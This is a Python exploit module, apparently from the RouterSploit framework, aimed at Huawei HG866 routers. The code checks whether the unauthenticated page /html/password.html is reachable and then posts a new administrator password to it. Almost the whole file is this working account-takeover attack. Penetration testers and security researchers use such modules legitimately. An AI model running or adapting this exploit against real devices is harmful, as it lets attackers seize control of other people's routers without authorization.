from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Huawei HG866 Password Change vulnerability.
    If the target is vulnerable it allows to change administration password.
    """
    __info__ = {
        'name': 'Huawei HG866 Password Cahnge',
        'description': 'Module exploits password change vulnerability in Huawei HG866 devices.'
                       'If the target is vulnerable it allows to change administration password.',
        'authors': [
            'hkm',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/19185/',
        ],
        'devices': [
            'Huawei HG866',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    password = exploits.Option('routersploit', 'Password value to change admin account with')

    def run(self):
        if self.check():
            url = "{}:{}/html/password.html".format(self.target, self.port)
            headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
            data = {'psw': self.password,
                    'reenterpsw': self.password,
                    'save': 'Apply'}

            print_status("Sending password change request")
            response = http_request(method="POST", url=url, headers=headers, data=data)

            if response.status_code == 200:
                print_success("Administrator's password has been changed to {}".format(self.password))
            else:
                print_error("Exploit failed - could not change password")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/html/password.html".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "psw" in response.text and "reenterpsw" in response.text:
            return True  # target is vulnerable

        return False  # target not vulnerable
